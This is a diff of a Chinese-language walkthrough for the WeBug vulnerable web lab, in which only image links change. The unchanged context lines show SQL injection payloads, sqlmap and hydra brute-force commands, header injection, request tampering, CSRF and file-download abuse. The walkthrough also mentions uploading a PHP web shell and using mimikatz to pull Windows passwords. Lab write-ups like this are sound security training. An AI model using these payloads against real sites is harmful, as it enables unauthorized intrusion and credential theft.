@@ -45,7 +45,7 @@ date: '2019-02-25T15:32:06.000Z'
   http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=‘-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database() %23
 ```
 
-![&#x83B7;&#x53D6;&#x8868;](../.gitbook/assets/1_1.png)
+![&#x83B7;&#x53D6;&#x8868;](../.gitbook/assets/1_1%20%281%29.png)
 
 获取当前数据库名称
 
@@ -53,7 +53,7 @@ date: '2019-02-25T15:32:06.000Z'
   http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=‘-1' union select 1,database(),3,4 --'
 ```
 
-![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../.gitbook/assets/1_2.png)
+![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../.gitbook/assets/1_2%20%281%29.png)
 
 获取`flag`表的所有列
 
@@ -61,7 +61,7 @@ date: '2019-02-25T15:32:06.000Z'
   http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= -1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = 'flag' %23
 ```
 
-![&#x83B7;&#x53D6;flag&#x8868;&#x7684;&#x6240;&#x6709;&#x5217;](../.gitbook/assets/1_3.png)
+![&#x83B7;&#x53D6;flag&#x8868;&#x7684;&#x6240;&#x6709;&#x5217;](../.gitbook/assets/1_3%20%281%29.png)
 
 获取`flag`表的中列的值
 
@@ -69,7 +69,7 @@ date: '2019-02-25T15:32:06.000Z'
   http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= -1' union select 1,flag,3,4 from flag %23
 ```
 
-![&#x83B7;&#x53D6;flag&#x8868;&#x7684;&#x4E2D;&#x5217;&#x7684;&#x503C;](../.gitbook/assets/1_4.png)
+![&#x83B7;&#x53D6;flag&#x8868;&#x7684;&#x4E2D;&#x5217;&#x7684;&#x503C;](../.gitbook/assets/1_4%20%281%29.png)
 
 ### 方法二
 
@@ -86,7 +86,7 @@ date: '2019-02-25T15:32:06.000Z'
 python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid --current-db
 ```
 
-![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../.gitbook/assets/1_5.png)
+![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../.gitbook/assets/1_5%20%281%29.png)
 
 获取当前数据库的所有表
 
@@ -94,7 +94,7 @@ python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p
 python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid -D  pentesterlab --tables
 ```
 
-![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../.gitbook/assets/1_6.png)
+![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../.gitbook/assets/1_6%20%281%29.png)
 
 获取`flag`表中的值
 
@@ -102,7 +102,7 @@ python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p
 python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid -D pentesterlab -T flag --dump
 ```
 
-![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../.gitbook/assets/1_7.png)
+![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../.gitbook/assets/1_7%20%281%29.png)
 
 ## 第二关-从图片中你能找到什么？
 
@@ -135,11 +135,11 @@ python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p
 
 1. 准备一张图片和一个文本
 
-![1.jpg&#x4E0E;1.txt](../.gitbook/assets/2_1.png)
+![1.jpg&#x4E0E;1.txt](../.gitbook/assets/2_1%20%281%29.png)
 
 1. 将`1.txt`压缩成`1.zip`
 
-![&#x538B;&#x7F29;1.txt](../.gitbook/assets/2_2.png)
+![&#x538B;&#x7F29;1.txt](../.gitbook/assets/2_2%20%281%29.png)
 
 1. 将`1.jpg`和`1.zip`合并成为`2.jpg`
 
@@ -147,15 +147,15 @@ python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p
 copy /b 1.jpg+1.zip   2.jpg
 ```
 
-![&#x6267;&#x884C;CMD&#x547D;&#x4EE4;](../.gitbook/assets/2_3.png)
+![&#x6267;&#x884C;CMD&#x547D;&#x4EE4;](../.gitbook/assets/2_3%20%281%29.png)
 
-![&#x7ED3;&#x679C;](../.gitbook/assets/2_4.png)
+![&#x7ED3;&#x679C;](../.gitbook/assets/2_4%20%281%29.png)
 
 1. 将`2.jpg`的后缀改为`2.rar`，从`rar`压缩里面可以看到一个`1.txt`文件
 
 改为`zip`的话，在`win10`上有时会出现错误，推荐`rar`
 
-![&#x7ED3;&#x679C;](../.gitbook/assets/2_5.png)
+![&#x7ED3;&#x679C;](../.gitbook/assets/2_5%20%281%29.png)
 
 ## 第三关-你看到了什么？
 
@@ -175,19 +175,19 @@ copy /b 1.jpg+1.zip   2.jpg
   http://169.254.91.186/pentest/test/san/index33.htm
 ```
 
-![&#x5F97;&#x5230;test&#x6587;&#x4EF6;&#x76EE;&#x5F55;](../.gitbook/assets/3_1.png)
+![&#x5F97;&#x5230;test&#x6587;&#x4EF6;&#x76EE;&#x5F55;](../.gitbook/assets/3_1%20%281%29.png)
 
 访问`test`
 
-![&#x7ED3;&#x679C;](../.gitbook/assets/3_2.png)
+![&#x7ED3;&#x679C;](../.gitbook/assets/3_2%20%281%29.png)
 
 尝试用`md5`加密`test`
 
-![&#x7ED3;&#x679C;](../.gitbook/assets/3_3.png)
+![&#x7ED3;&#x679C;](../.gitbook/assets/3_3%20%281%29.png)
 
 访问经过16位加密后的test的网址
 
-![&#x7ED3;&#x679C;](../.gitbook/assets/3_4.png)
+![&#x7ED3;&#x679C;](../.gitbook/assets/3_4%20%281%29.png)
 
 ## 第四关-告诉你了FLANG是5位数
 
@@ -208,7 +208,7 @@ copy /b 1.jpg+1.zip   2.jpg
   http://169.254.91.186/pentest/test/b2e16da5985ee1be/login.php
 ```
 
-![hackbar](../.gitbook/assets/4_1.png)
+![hackbar](../.gitbook/assets/4_1%20%281%29.png)
 
 准备存放常见用户名的文本user.txt和存放常见密码的文本passwd.txt
 
@@ -218,7 +218,7 @@ copy /b 1.jpg+1.zip   2.jpg
   hydra -L user.txt -P passwd.txt -o output.log -vV -t 10  -f 169.254.91.186 http-post-form "/pentest/test/b2e16da5985ee1be/login.php:username=^USER^&pwd=^PASS^:login failure"
 ```
 
-![&#x7ED3;&#x679C;](../.gitbook/assets/4_2.png)
+![&#x7ED3;&#x679C;](../.gitbook/assets/4_2%20%281%29.png)
 
 ## 第五关-一个优点小小的特殊的注入
 
@@ -234,11 +234,11 @@ copy /b 1.jpg+1.zip   2.jpg
 
 使用 `Modify Headers` 来进行`HTTP`头注入，常见的有获取客户端`IP`,`http-client-ip`,`x_forwarded_for` 等
 
-![&#x4F7F;&#x7528;Modify Headers &#x6765;&#x8FDB;&#x884C;HTTP&#x5934;&#x6CE8;&#x5165;](../.gitbook/assets/5_1.png)
+![&#x4F7F;&#x7528;Modify Headers &#x6765;&#x8FDB;&#x884C;HTTP&#x5934;&#x6CE8;&#x5165;](../.gitbook/assets/5_1%20%281%29.png)
 
-![&#x70B9;&#x51FB;start&#x5E76;&#x5237;&#x65B0;&#x9875;&#x9762;](../.gitbook/assets/5_2.png)
+![&#x70B9;&#x51FB;start&#x5E76;&#x5237;&#x65B0;&#x9875;&#x9762;](../.gitbook/assets/5_2%20%281%29.png)
 
-![&#x53EF;&#x77E5;&#x5F53;&#x524D;&#x8868;&#x6709;4&#x5217;](../.gitbook/assets/5_3.png)
+![&#x53EF;&#x77E5;&#x5F53;&#x524D;&#x8868;&#x6709;4&#x5217;](../.gitbook/assets/5_3%20%281%29.png)
 
 ### 获取当前数据库名称
 
@@ -246,7 +246,7 @@ copy /b 1.jpg+1.zip   2.jpg
   union select 1,database(),3,4
 ```
 
-![&#x53EF;&#x77E5;&#x5F53;&#x524D;&#x8868;&#x6709;4&#x5217;](../.gitbook/assets/5_4.png)
+![&#x53EF;&#x77E5;&#x5F53;&#x524D;&#x8868;&#x6709;4&#x5217;](../.gitbook/assets/5_4%20%281%29.png)
 
 获取当前表所在数据库的所有表
 
@@ -254,7 +254,7 @@ copy /b 1.jpg+1.zip   2.jpg
   union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()
 ```
 
-![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8868;&#x6240;&#x5728;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6240;&#x6709;&#x8868;](../.gitbook/assets/5_5.png)
+![&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8868;&#x6240;&#x5728;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6240;&#x6709;&#x8868;](../.gitbook/assets/5_5%20%281%29.png)
 
 获取flag表所有列
 
@@ -262,7 +262,7 @@ copy /b 1.jpg+1.zip   2.jpg
   union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = 'flag'
 ```
 
-![&#x83B7;&#x53D6;flag&#x8868;&#x6240;&#x6709;&#x5217;](../.gitbook/assets/5_6.png)
+![&#x83B7;&#x53D6;flag&#x8868;&#x6240;&#x6709;&#x5217;](../.gitbook/assets/5_6%20%281%29.png)
 
 获取flag表中某属性的值
 
@@ -270,7 +270,7 @@ copy /b 1.jpg+1.zip   2.jpg
   union select 1,flag,3,4 from flag
 ```
 
-![&#x83B7;&#x53D6;flag&#x8868;&#x4E2D;flag&#x7684;&#x503C;](../.gitbook/assets/5_7.png)
+![&#x83B7;&#x53D6;flag&#x8868;&#x4E2D;flag&#x7684;&#x503C;](../.gitbook/assets/5_7%20%281%29.png)
 
 ## 第六关-这关需要RMB购买哦
 
@@ -282,11 +282,11 @@ copy /b 1.jpg+1.zip   2.jpg
 
 密码在第七关的入口,也可以尝试暴力破解:
 
-![&#x83B7;&#x53D6;&#x8D26;&#x53F7;&#x5BC6;&#x7801;](../.gitbook/assets/6_1.png)
+![&#x83B7;&#x53D6;&#x8D26;&#x53F7;&#x5BC6;&#x7801;](../.gitbook/assets/6_1%20%281%29.png)
 
 输入负数
 
-![&#x83B7;&#x53D6;&#x8D26;&#x53F7;&#x5BC6;&#x7801;](../.gitbook/assets/6_2.png)
+![&#x83B7;&#x53D6;&#x8D26;&#x53F7;&#x5BC6;&#x7801;](../.gitbook/assets/6_2%20%281%29.png)
 
 ### 方法二
 
@@ -298,11 +298,11 @@ copy /b 1.jpg+1.zip   2.jpg
 
 先开启`Burp Suite`的代理，截断包的发送，然后输入要购买的数量，然后点击购买
 
-![&#x5F00;&#x542F;&#x4EE3;&#x7406;](../.gitbook/assets/6_3.png)
+![&#x5F00;&#x542F;&#x4EE3;&#x7406;](../.gitbook/assets/6_3%20%281%29.png)
 
 在Params处，可以看到发送的包的值
 
-![&#x67E5;&#x770B;&#x5305;](../.gitbook/assets/6_4.png)
+![&#x67E5;&#x770B;&#x5305;](../.gitbook/assets/6_4%20%281%29.png)
 
 抓包,改包
 
@@ -313,11 +313,11 @@ copy /b 1.jpg+1.zip   2.jpg
   5 + 20 = 25
 ```
 
-![&#x6539;&#x5305;](../.gitbook/assets/6_5.png)
+![&#x6539;&#x5305;](../.gitbook/assets/6_5%20%281%29.png)
 
 解除代理，查看结果
 
-![&#x6539;&#x5305;&#x7ED3;&#x679C;](../.gitbook/assets/6_6.png)
+![&#x6539;&#x5305;&#x7ED3;&#x679C;](../.gitbook/assets/6_6%20%281%29.png)
 
 ## 第七关-越权
 
@@ -331,23 +331,23 @@ copy /b 1.jpg+1.zip   2.jpg
 
 发现在密码修改页面的url中带有name字样
 
-![change.php?name=tom](../.gitbook/assets/7_1.png)
+![change.php?name=tom](../.gitbook/assets/7_1%20%281%29.png)
 
 测试修改密码发现没有进行旧密码验证和当前用户判断
 
-![&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x540E;](../.gitbook/assets/7_2.png)
+![&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x540E;](../.gitbook/assets/7_2%20%281%29.png)
 
 修改url
 
-![?name=admin](../.gitbook/assets/7_3.png)
+![?name=admin](../.gitbook/assets/7_3%20%281%29.png)
 
 提交前，开启代理，点击提交，修改包，解除代理
 
-![&#x6539;&#x5305;](../.gitbook/assets/7_4_1.png)
+![&#x6539;&#x5305;](../.gitbook/assets/7_4_1%20%281%29.png)
 
-![&#x89E3;&#x9664;&#x4EE3;&#x7406;&#x7ED3;&#x679C;](../.gitbook/assets/7_4.png)
+![&#x89E3;&#x9664;&#x4EE3;&#x7406;&#x7ED3;&#x679C;](../.gitbook/assets/7_4%20%281%29.png)
 
-![&#x7ED3;&#x679C;](../.gitbook/assets/7_5.png)
+![&#x7ED3;&#x679C;](../.gitbook/assets/7_5%20%281%29.png)
 
 ## 第八关-CSRF
 
@@ -363,29 +363,29 @@ copy /b 1.jpg+1.zip   2.jpg
 
 用`tom`登录,进入主页
 
-![tom](../.gitbook/assets/8_0.png)
+![tom](../.gitbook/assets/8_0%20%281%29.png)
 
 点击“更改密码”
 
 > 源php文件无法进行修改密码操作，已更改
 
-![&#x66F4;&#x6539;&#x5BC6;&#x7801;](../.gitbook/assets/8_1.png)
+![&#x66F4;&#x6539;&#x5BC6;&#x7801;](../.gitbook/assets/8_1%20%281%29.png)
 
 源码已更正,允许修改密码,再次进入更改密码界面
 
-![&#x5BC6;&#x7801;&#x4FEE;&#x6539;&#x7ED3;&#x679C;](../.gitbook/assets/8_2.png)
+![&#x5BC6;&#x7801;&#x4FEE;&#x6539;&#x7ED3;&#x679C;](../.gitbook/assets/8_2%20%281%29.png)
 
 开启代理，输入密码：`klklkl`，点击“更改密码”
 
-![&#x4F7F;&#x7528;Burp Suite](../.gitbook/assets/8_3.png)
+![&#x4F7F;&#x7528;Burp Suite](../.gitbook/assets/8_3%20%281%29.png)
 
 修改`username`的值为`admin`，然后构造
 
-![&#x6784;&#x9020;CSRF](../.gitbook/assets/8_4.png)
+![&#x6784;&#x9020;CSRF](../.gitbook/assets/8_4%20%281%29.png)
 
 制作对应的网页，或者test一下
 
-![CSRF](../.gitbook/assets/8_5.png)
+![CSRF](../.gitbook/assets/8_5%20%281%29.png)
 
 制作网页
 
@@ -409,19 +409,19 @@ copy /b 1.jpg+1.zip   2.jpg
 
 没头绪，看源码
 
-![webug&#x6E90;&#x7801;](../.gitbook/assets/9_1.png)
+![webug&#x6E90;&#x7801;](../.gitbook/assets/9_1%20%281%29.png)
 
 填写`?url=http://www.baidu.com`
 
-![?url=http://www.baidu.com](../.gitbook/assets/9_2.png)
+![?url=http://www.baidu.com](../.gitbook/assets/9_2%20%281%29.png)
 
 跳转url
 
-![&#x5C1D;&#x8BD5;&#x8DF3;&#x8F6C;](../.gitbook/assets/9_3.png)
+![&#x5C1D;&#x8BD5;&#x8DF3;&#x8F6C;](../.gitbook/assets/9_3%20%281%29.png)
 
 > 备注：若出现不安全链接提示，直接关闭代理即可
 
-![&#x5173;&#x95ED;&#x4EE3;&#x7406;](../.gitbook/assets/9_4.png)
+![&#x5173;&#x95ED;&#x4EE3;&#x7406;](../.gitbook/assets/9_4%20%281%29.png)
 
 ## 第十关-文件下载
 
@@ -456,15 +456,15 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 标题和数据库有关，联想刚刚扫描到的目录
 
-![](../.gitbook/assets/mk-2020-03-17-20-57-43.png)
+![](../.gitbook/assets/mk-2020-03-17-20-57-43%20%281%29.png)
 
 1. 扫描目录，得到 `config.php`
 
-![](../.gitbook/assets/mk-2020-03-17-20-58-00.png)
+![](../.gitbook/assets/mk-2020-03-17-20-58-00%20%281%29.png)
 
 1. 一般不直接访问，这里直接访问，发现还有语法错误
 
-![](../.gitbook/assets/mk-2020-03-17-20-58-10.png)
+![](../.gitbook/assets/mk-2020-03-17-20-58-10%20%281%29.png)
 
 此时，有两种方法获取账号密码：
 
@@ -480,11 +480,11 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 取消代理，获取文件
 
-![](../.gitbook/assets/mk-2020-03-17-21-00-40.png)
+![](../.gitbook/assets/mk-2020-03-17-21-00-40%20%281%29.png)
 
 1. 得到有关账号密码的信息
 
-![](../.gitbook/assets/mk-2020-03-17-21-00-58.png)
+![](../.gitbook/assets/mk-2020-03-17-21-00-58%20%286%29.png)
 
 #### 方法二
 
@@ -498,7 +498,7 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 得到有关账号密码的信息
 
-![](../.gitbook/assets/mk-2020-03-17-21-00-58%20%284%29.png)
+![](../.gitbook/assets/mk-2020-03-17-21-00-58%20%286%29%20%284%29.png)
 
 ## 第十一关-我和上一关有点像
 
@@ -525,11 +525,11 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 用的是`post`，那只能改`post`包了
 
-![](../.gitbook/assets/mk-2020-03-17-21-19-34.png)
+![](../.gitbook/assets/mk-2020-03-17-21-19-34%20%281%29.png)
 
 1. 抓包，改包，获得`config.php`
 
-![](../.gitbook/assets/mk-2020-03-17-21-19-48.png)
+![](../.gitbook/assets/mk-2020-03-17-21-19-48%20%281%29.png)
 
 1. 查看`config.php`文件，可以看到类似账号密码的信息
 
@@ -552,15 +552,15 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 主页
 
-![](../.gitbook/assets/mk-2020-03-17-21-29-12.png)
+![](../.gitbook/assets/mk-2020-03-17-21-29-12%20%281%29.png)
 
 1. 发现上传功能，构建 `php`，上传
 
-![](../.gitbook/assets/mk-2020-03-17-21-29-30.png)
+![](../.gitbook/assets/mk-2020-03-17-21-29-30%20%281%29.png)
 
 1. 上传 `go.php` 成功，在 8 目录下的 `upload` 文件夹中
 
-![](../.gitbook/assets/mk-2020-03-17-21-29-46.png)
+![](../.gitbook/assets/mk-2020-03-17-21-29-46%20%281%29.png)
 
 1. 在菜刀空白处右键新建连接
 
@@ -580,7 +580,7 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 由于题目要求是找回系统账号密码，遵守游戏规则，使用 `mimikatz` 来获取系统账号密码，先上传 `mimikatz` 组件。
 
-![](../.gitbook/assets/mk-2020-03-17-21-36-10.png)
+![](../.gitbook/assets/mk-2020-03-17-21-36-10%20%281%29.png)
 
 1. `mimikatz` 使用起来也非常简单，提取 `Windows` 系统的明文密码只需两行命令：
 
@@ -598,7 +598,7 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 可以下载或者双击打开查看，成功获取系统账号密码
 
-![](../.gitbook/assets/mk-2020-03-17-21-37-50.png)
+![](../.gitbook/assets/mk-2020-03-17-21-37-50%20%281%29.png)
 
 ### 附加
 
@@ -713,7 +713,7 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 正常模式：`http://192.168.246.128/pentest/test/12/`
 
-![](../.gitbook/assets/mk-2020-03-17-22-07-13.png)
+![](../.gitbook/assets/mk-2020-03-17-22-07-13%20%281%29.png)
 
 1. 点击一下`Go`，发现`url`多了一个`?url=`
 
@@ -725,7 +725,7 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 输入`www.taobao.com`看看
 
-![](../.gitbook/assets/mk-2020-03-17-22-07-57.png)
+![](../.gitbook/assets/mk-2020-03-17-22-07-57%20%281%29.png)
 
 1. 显示只允许特定`ip`
 
@@ -733,11 +733,11 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 输入`10.10.10.10`后则显示
 
-![](../.gitbook/assets/mk-2020-03-17-22-08-22.png)
+![](../.gitbook/assets/mk-2020-03-17-22-08-22%20%281%29.png)
 
 1. 输入`www.taobao.com`，查看`burp`
 
-![](../.gitbook/assets/mk-2020-03-17-22-08-33.png)
+![](../.gitbook/assets/mk-2020-03-17-22-08-33%20%281%29.png)
 
 1. 把`HOST`改成`10.10.10.10`
 
@@ -747,17 +747,17 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 显示`nonono`
 
-![](../.gitbook/assets/mk-2020-03-17-22-09-15.png)
+![](../.gitbook/assets/mk-2020-03-17-22-09-15%20%281%29.png)
 
 1. 把`Referer`改为`www.taobao.com`
 
    `HTTP Referer`是`header`的一部分，当浏览器向`web`服务器发送请求的时候，一般会带上`Referer`，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。
 
-   ![](../.gitbook/assets/mk-2020-03-17-22-09-41.png)
+   ![](../.gitbook/assets/mk-2020-03-17-22-09-41%20%281%29.png)
 
 2. em...
 
-![](../.gitbook/assets/mk-2020-03-17-22-09-56.png)
+![](../.gitbook/assets/mk-2020-03-17-22-09-56%20%281%29.png)
 
 1. 看源码，发现是我的来源应该是`www.baidu.com`
 
@@ -834,11 +834,11 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 改包
 
-![](../.gitbook/assets/mk-2020-03-17-22-37-20.png)
+![](../.gitbook/assets/mk-2020-03-17-22-37-20%20%281%29.png)
 
 1. 发现存在任意文件读取漏洞
 
-![](../.gitbook/assets/mk-2020-03-17-22-37-32.png)
+![](../.gitbook/assets/mk-2020-03-17-22-37-32%20%281%29.png)
 
 ## 中级第三关-我还是一个注入
 
@@ -923,7 +923,7 @@ copy /b 1.jpg+1.zip   2.jpg
 
 1. 累死人的操作，把机械点击操作交给模拟器吧
 
-![](../.gitbook/assets/mk-2020-03-17-22-49-11.png)
+![](../.gitbook/assets/mk-2020-03-17-22-49-11%20%281%29.png)
 
 1. 看起来是`md5`加密的东西
 
